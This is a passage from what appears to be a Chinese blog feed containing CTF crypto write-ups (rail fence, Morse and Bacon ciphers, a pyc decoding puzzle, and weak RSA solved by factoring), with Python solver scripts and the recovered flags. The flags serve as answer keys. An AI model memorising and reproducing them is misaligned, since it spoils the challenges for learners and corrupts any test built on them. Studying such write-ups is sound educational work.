class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):</span><br><span class="line">        i_s.append(a)</span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num - <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">        i_s.append(a)</span><br><span class="line">    i_s_len = <span class="hljs-built_in">len</span>(i_s)</span><br><span class="line">    decrypted = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)):</span><br><span class="line">        decrypted += matrix[i_s[j % i_s_len]][j]</span><br><span class="line">    <span class="hljs-keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted = <span class="hljs-string">'ccehgyaefnpeoobe{lcirg}epriec_ora_g'</span></span><br><span class="line">num = <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-built_in">print</span>(dec(encrypted, num))</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">cyberpeace</span><span class="hljs-template-variable">{railfence_cipher_gogogo}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h4><p>题目描述非常直接</p><figure class="highlight dns hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=<span class="hljs-number">473398607161</span>，q=<span class="hljs-number">4511491</span>，e=<span class="hljs-number">17</span></span><br><span class="line">求解出d</span><br></pre></td></tr></tbody></table></figure><p>甚至不用求解<code>rsa</code>，找到d就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcdext</span>(<span class="hljs-params">a, b</span>):</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    a: 模的取值</span></span><br><span class="line"><span class="hljs-string">    b: 想求逆的值</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a</span><br><span class="line">    x, y, gcd = gcdext(b, a % b)</span><br><span class="line">    <span class="hljs-keyword">return</span> y, x - a // b * y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="hljs-number">169169912654178</span></span><br><span class="line">p = <span class="hljs-number">473398607161</span></span><br><span class="line">q = <span class="hljs-number">4511491</span></span><br><span class="line">e = <span class="hljs-number">17</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="hljs-comment"># print(k)</span></span><br><span class="line">fai = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)</span><br><span class="line">(d, k, g) = gcdext(e, fai)</span><br><span class="line"><span class="hljs-built_in">print</span>(d)</span><br><span class="line"><span class="hljs-comment"># 125631357777427553</span></span><br></pre></td></tr></tbody></table></figure><h4 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h4><p>拿到一段摩斯密码，解一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">CODE = {</span><br><span class="line">    <span class="hljs-string">'A'</span>: <span class="hljs-string">'.-'</span>,</span><br><span class="line">    <span class="hljs-string">'B'</span>: <span class="hljs-string">'-...'</span>,</span><br><span class="line">    <span class="hljs-string">'C'</span>: <span class="hljs-string">'-.-.'</span>,</span><br><span class="line">    <span class="hljs-string">'D'</span>: <span class="hljs-string">'-..'</span>,</span><br><span class="line">    <span class="hljs-string">'E'</span>: <span class="hljs-string">'.'</span>,</span><br><span class="line">    <span class="hljs-string">'F'</span>: <span class="hljs-string">'..-.'</span>,</span><br><span class="line">    <span class="hljs-string">'G'</span>: <span class="hljs-string">'--.'</span>,</span><br><span class="line">    <span class="hljs-string">'H'</span>: <span class="hljs-string">'....'</span>,</span><br><span class="line">    <span class="hljs-string">'I'</span>: <span class="hljs-string">'..'</span>,</span><br><span class="line">    <span class="hljs-string">'J'</span>: <span class="hljs-string">'.---'</span>,</span><br><span class="line">    <span class="hljs-string">'K'</span>: <span class="hljs-string">'-.-'</span>,</span><br><span class="line">    <span class="hljs-string">'L'</span>: <span class="hljs-string">'.-..'</span>,</span><br><span class="line">    <span class="hljs-string">'M'</span>: <span class="hljs-string">'--'</span>,</span><br><span class="line">    <span class="hljs-string">'N'</span>: <span class="hljs-string">'-.'</span>,</span><br><span class="line">    <span class="hljs-string">'O'</span>: <span class="hljs-string">'---'</span>,</span><br><span class="line">    <span class="hljs-string">'P'</span>: <span class="hljs-string">'.--.'</span>,</span><br><span class="line">    <span class="hljs-string">'Q'</span>: <span class="hljs-string">'--.-'</span>,</span><br><span class="line">    <span class="hljs-string">'R'</span>: <span class="hljs-string">'.-.'</span>,</span><br><span class="line">    <span class="hljs-string">'S'</span>: <span class="hljs-string">'...'</span>,</span><br><span class="line">    <span class="hljs-string">'T'</span>: <span class="hljs-string">'-'</span>,</span><br><span class="line">    <span class="hljs-string">'U'</span>: <span class="hljs-string">'..-'</span>,</span><br><span class="line">    <span class="hljs-string">'V'</span>: <span class="hljs-string">'...-'</span>,</span><br><span class="line">    <span class="hljs-string">'W'</span>: <span class="hljs-string">'.--'</span>,</span><br><span class="line">    <span class="hljs-string">'X'</span>: <span class="hljs-string">'-..-'</span>,</span><br><span class="line">    <span class="hljs-string">'Y'</span>: <span class="hljs-string">'-.--'</span>,</span><br><span class="line">    <span class="hljs-string">'Z'</span>: <span class="hljs-string">'--..'</span>,</span><br><span class="line">    <span class="hljs-string">'0'</span>: <span class="hljs-string">'-----'</span>,</span><br><span class="line">    <span class="hljs-string">'1'</span>: <span class="hljs-string">'.----'</span>,</span><br><span class="line">    <span class="hljs-string">'2'</span>: <span class="hljs-string">'..---'</span>,</span><br><span class="line">    <span class="hljs-string">'3'</span>: <span class="hljs-string">'...--'</span>,</span><br><span class="line">    <span class="hljs-string">'4'</span>: <span class="hljs-string">'....-'</span>,</span><br><span class="line">    <span class="hljs-string">'5'</span>: <span class="hljs-string">'.....'</span>,</span><br><span class="line">    <span class="hljs-string">'6'</span>: <span class="hljs-string">'-....'</span>,</span><br><span class="line">    <span class="hljs-string">'7'</span>: <span class="hljs-string">'--...'</span>,</span><br><span class="line">    <span class="hljs-string">'8'</span>: <span class="hljs-string">'---..'</span>,</span><br><span class="line">    <span class="hljs-string">'9'</span>: <span class="hljs-string">'----.'</span>,</span><br><span class="line">    <span class="hljs-string">'.'</span>: <span class="hljs-string">'.-.-.-'</span>,</span><br><span class="line">    <span class="hljs-string">':'</span>: <span class="hljs-string">'---...'</span>,</span><br><span class="line">    <span class="hljs-string">','</span>: <span class="hljs-string">'--..--'</span>,</span><br><span class="line">    <span class="hljs-string">';'</span>: <span class="hljs-string">'-.-.-.'</span>,</span><br><span class="line">    <span class="hljs-string">'?'</span>: <span class="hljs-string">'..--..'</span>,</span><br><span class="line">    <span class="hljs-string">'='</span>: <span class="hljs-string">'-...-'</span>,</span><br><span class="line">    <span class="hljs-string">'\''</span>: <span class="hljs-string">'.----.'</span>,</span><br><span class="line">    <span class="hljs-string">'/'</span>: <span class="hljs-string">'-..-.'</span>,</span><br><span class="line">    <span class="hljs-string">'!'</span>: <span class="hljs-string">'-.-.--'</span>,</span><br><span class="line">    <span class="hljs-string">'-'</span>: <span class="hljs-string">'-....-'</span>,</span><br><span class="line">    <span class="hljs-string">'_'</span>: <span class="hljs-string">'..--.-'</span>,</span><br><span class="line">    <span class="hljs-string">'"'</span>: <span class="hljs-string">'.-..-.'</span>,</span><br><span class="line">    <span class="hljs-string">'('</span>: <span class="hljs-string">'-.--.'</span>,</span><br><span class="line">    <span class="hljs-string">')'</span>: <span class="hljs-string">'-.--.-'</span>,</span><br><span class="line">    <span class="hljs-string">'$'</span>: <span class="hljs-string">'...-..-'</span>,</span><br><span class="line">    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'.-...'</span>,</span><br><span class="line">    <span class="hljs-string">'@'</span>: <span class="hljs-string">'.--.-.'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-comment"># print(str)</span></span><br><span class="line">    msg = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">'/'</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> msg:</span><br><span class="line">        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text += Decode_dict[s]</span><br><span class="line">    <span class="hljs-keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">str</span> = <span class="hljs-string">'--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(Decode(<span class="hljs-built_in">str</span>).lower())</span><br><span class="line"><span class="hljs-comment"># may_be_have_another_decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span></span><br></pre></td></tr></tbody></table></figure><p>这一段ab组成的密文是培根密码，写脚本解一下培根密码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba'</span></span><br><span class="line"></span><br><span class="line">CODE_TABLE = {</span><br><span class="line">    <span class="hljs-string">'a'</span>: <span class="hljs-string">'aaaaa'</span>,</span><br><span class="line">    <span class="hljs-string">'b'</span>: <span class="hljs-string">'aaaab'</span>,</span><br><span class="line">    <span class="hljs-string">'c'</span>: <span class="hljs-string">'aaaba'</span>,</span><br><span class="line">    <span class="hljs-string">'d'</span>: <span class="hljs-string">'aaabb'</span>,</span><br><span class="line">    <span class="hljs-string">'e'</span>: <span class="hljs-string">'aabaa'</span>,</span><br><span class="line">    <span class="hljs-string">'f'</span>: <span class="hljs-string">'aabab'</span>,</span><br><span class="line">    <span class="hljs-string">'g'</span>: <span class="hljs-string">'aabba'</span>,</span><br><span class="line">    <span class="hljs-string">'h'</span>: <span class="hljs-string">'aabbb'</span>,</span><br><span class="line">    <span class="hljs-string">'i'</span>: <span class="hljs-string">'abaaa'</span>,</span><br><span class="line">    <span class="hljs-string">'j'</span>: <span class="hljs-string">'abaab'</span>,</span><br><span class="line">    <span class="hljs-string">'k'</span>: <span class="hljs-string">'ababa'</span>,</span><br><span class="line">    <span class="hljs-string">'l'</span>: <span class="hljs-string">'ababb'</span>,</span><br><span class="line">    <span class="hljs-string">'m'</span>: <span class="hljs-string">'abbaa'</span>,</span><br><span class="line">    <span class="hljs-string">'n'</span>: <span class="hljs-string">'abbab'</span>,</span><br><span class="line">    <span class="hljs-string">'o'</span>: <span class="hljs-string">'abbba'</span>,</span><br><span class="line">    <span class="hljs-string">'p'</span>: <span class="hljs-string">'abbbb'</span>,</span><br><span class="line">    <span class="hljs-string">'q'</span>: <span class="hljs-string">'baaaa'</span>,</span><br><span class="line">    <span class="hljs-string">'r'</span>: <span class="hljs-string">'baaab'</span>,</span><br><span class="line">    <span class="hljs-string">'s'</span>: <span class="hljs-string">'baaba'</span>,</span><br><span class="line">    <span class="hljs-string">'t'</span>: <span class="hljs-string">'baabb'</span>,</span><br><span class="line">    <span class="hljs-string">'u'</span>: <span class="hljs-string">'babaa'</span>,</span><br><span class="line">    <span class="hljs-string">'v'</span>: <span class="hljs-string">'babab'</span>,</span><br><span class="line">    <span class="hljs-string">'w'</span>: <span class="hljs-string">'babba'</span>,</span><br><span class="line">    <span class="hljs-string">'x'</span>: <span class="hljs-string">'babbb'</span>,</span><br><span class="line">    <span class="hljs-string">'y'</span>: <span class="hljs-string">'bbaaa'</span>,</span><br><span class="line">    <span class="hljs-string">'z'</span>: <span class="hljs-string">'bbaab'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bacondecode</span>(<span class="hljs-params">bacon</span>):</span></span><br><span class="line">    msg = <span class="hljs-string">''</span></span><br><span class="line">    codes = re.findall(<span class="hljs-string">r'.{5}'</span>, bacon)</span><br><span class="line">    <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> codes:</span><br><span class="line">        <span class="hljs-keyword">if</span> code == <span class="hljs-string">''</span>:</span><br><span class="line">            msg += <span class="hljs-string">' '</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            UNCODE = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> t: (t[<span class="hljs-number">1</span>], t[<span class="hljs-number">0</span>]), CODE_TABLE.items()))</span><br><span class="line">            msg += UNCODE[code]</span><br><span class="line">    <span class="hljs-keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bacondecode(s)</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">'flag is '</span>, flag)</span><br><span class="line"><span class="hljs-comment"># flag is  attackanddefenceworldisinteresting</span></span><br></pre></td></tr></tbody></table></figure><h4 id="easychallenge"><a href="#easychallenge" class="headerlink" title="easychallenge"></a>easychallenge</h4><p><code>re</code>和<code>crypto</code>一家石锤</p><p><code>pyc</code>没做任何修改，直接<code>uncompyle6</code>反编译，得到结果改一下算法逆向计算一下得到结果</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode1</span>(<span class="hljs-params">ans</span>):</span></span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans:</span><br><span class="line">        x = <span class="hljs-built_in">ord</span>(i) - <span class="hljs-number">25</span></span><br><span class="line">        x = x ^ <span class="hljs-number">36</span></span><br><span class="line">        s += <span class="hljs-built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode2</span>(<span class="hljs-params">ans</span>):</span></span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans:</span><br><span class="line">        x = i ^ <span class="hljs-number">36</span></span><br><span class="line">        x = x - <span class="hljs-number">36</span></span><br><span class="line">        s += <span class="hljs-built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode3</span>(<span class="hljs-params">ans</span>):</span></span><br><span class="line">    <span class="hljs-keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">' '</span></span><br><span class="line">final = <span class="hljs-string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="hljs-built_in">print</span>(encode1(encode2(encode3(final))))</span><br><span class="line"><span class="hljs-comment"># cyberpeace{interestinghhhhh}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Normal-RSA"><a href="#Normal-RSA" class="headerlink" title="Normal_RSA"></a>Normal_RSA</h4><p>这题算是进入了基本的<code>crypto</code>领域了</p><p>首先作为一个脚本小子，直接拿别人的工具就可以跑出结果</p><p><a href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-tool</a>很不错，虽然里面大部分的解法目前我还都不会</p><hr><p>正常解法</p><p>首先用<code>openssl</code>解析一下公钥</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-&gt; openssl rsa -pubin -text -modulus -<span class="hljs-keyword">in</span> pubkey.pem</span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:<span class="hljs-built_in">cd</span>:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></tbody></table></figure><p>得到了<code>n=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</code>，<code>e=65537</code>，这个n不是很大，所以<code>yafu</code>直接分解，很快得到<code>p</code>和<code>q</code></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 319576316814478949870590164193048041239</span><br><span class="line">P39 = 275127860351348928173285174381581152299</span><br></pre></td></tr></tbody></table></figure><p>然后正常<code>rsa</code>的套路跑一边很快就可以得到结果</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytes2num</span>(<span class="hljs-params">b</span>):</span></span><br><span class="line">    s = <span class="hljs-string">'0x'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b:</span><br><span class="line">        tmp = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:]</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">2</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            tmp = <span class="hljs-string">'0'</span> + tmp</span><br><span class="line">        <span class="hljs-comment">#print(tmp)</span></span><br><span class="line">        s += tmp</span><br><span class="line">        num = <span class="hljs-built_in">int</span>(s, <span class="hljs-number">16</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">num2str</span>(<span class="hljs-params">n</span>):</span></span><br><span class="line">    tmp = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(n))[<span class="hljs-number">2</span>:]</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        tmp = <span class="hljs-string">'0'</span> + tmp</span><br><span class="line">    s = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(tmp), <span class="hljs-number">2</span>):</span><br><span class="line">        temp = tmp[i] + tmp[i + <span class="hljs-number">1</span>]</span><br><span class="line">        s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(temp, <span class="hljs-number">16</span>))</span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="hljs-built_in">open</span>(<span class="hljs-string">"flag.enc"</span>, <span class="hljs-string">"rb"</span>)</span><br><span class="line">r = r.read()</span><br><span class="line">r = bytes2num(r)</span><br><span class="line">e = <span class="hljs-number">65537</span></span><br><span class="line">n = <span class="hljs-number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">p = <span class="hljs-number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="hljs-number">319576316814478949870590164193048041239</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))</span><br><span class="line"><span class="hljs-comment">#print(d)</span></span><br><span class="line">m = <span class="hljs-built_in">pow</span>(r, <span class="hljs-built_in">int</span>(d), n)</span><br><span class="line"><span class="hljs-built_in">print</span>(num2str(m))</span><br><span class="line"><span class="hljs-comment"># PCTF{256b_i5_m3dium}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 驱动学习笔记</title>
      <link href="/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
